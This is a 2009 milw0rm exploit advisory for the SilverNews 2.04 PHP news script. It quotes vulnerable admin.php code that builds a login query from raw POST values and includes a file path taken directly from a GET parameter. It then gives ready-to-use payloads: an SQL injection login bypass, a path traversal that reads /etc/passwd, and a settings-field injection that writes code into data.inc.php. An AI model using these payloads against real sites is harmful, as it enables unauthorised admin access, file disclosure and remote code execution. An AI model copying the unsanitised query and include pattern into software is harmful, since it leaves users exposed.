@@ -1,0 +1,62 @@
+#########################################################################################
+[0x01] Informations:
+
+Name           : SilverNews 2.04
+Download       :
+http://www.silver-scripts.de/scripts.php?script=SilverNews&l=en
+Vulnerability  : Auth Bypass\LFI\RCE
+Author         : x0r
+Contact        : andry2000@hotmail.it
+Notes          : Proud to be Italian
+#########################################################################################
+[0x02] Bug:
+
+Bugged file is /[path]/admin.php
+
+[Code]
+	// Get the user information from the database
+	$getinfo = $sql->query("SELECT password, username, id FROM
+sn".$sql->prefix."_user WHERE username = '".$_POST['username']."' AND
+password = '".$_POST['password']."'");
+	$info = $sql->fetch_array($getinfo);
+...
+
+	// If "act" isn't set the user will be sent to the homepage.
+	if (!$_GET['act'] AND !$_POST['act'] AND !$_GET['section'])
+	{
+		$_GET['section'] = 'home';
+	}
+
+	require "admin/header.php";
+
+	if (file_exists('admin/'.$_GET['section'].".php"))
+	{
+		require 'admin/'.$_GET['section'].'.php'; #LFI
+	}
+	else
+	{
+		$admin->error('Datei konnte nicht gefunden werden!');
+	}
+
+	require "admin/footer.php";
+[/code]
+
+#########################################################################################
+
+
+#########################################################################################
+[0x03] Exploit:
+
+Exploit: username: ' or '1=1
+         password: x0r
+
+LFI: admin.php?section=../../../../../../../../../../etc/passwd%00
+
+RCE:
+So we can bypass the admin login and then go to admin/settings.php and put your
+evil code ^^ ex: 'show_cat_prefix' => $_POST['show_cat_prefix'], in the sho_cat_prefix we
+put: x0r'; echo 'lol   --> /data.inc.php
+
+########################################################################################
+
+# milw0rm.com [2009-02-06]
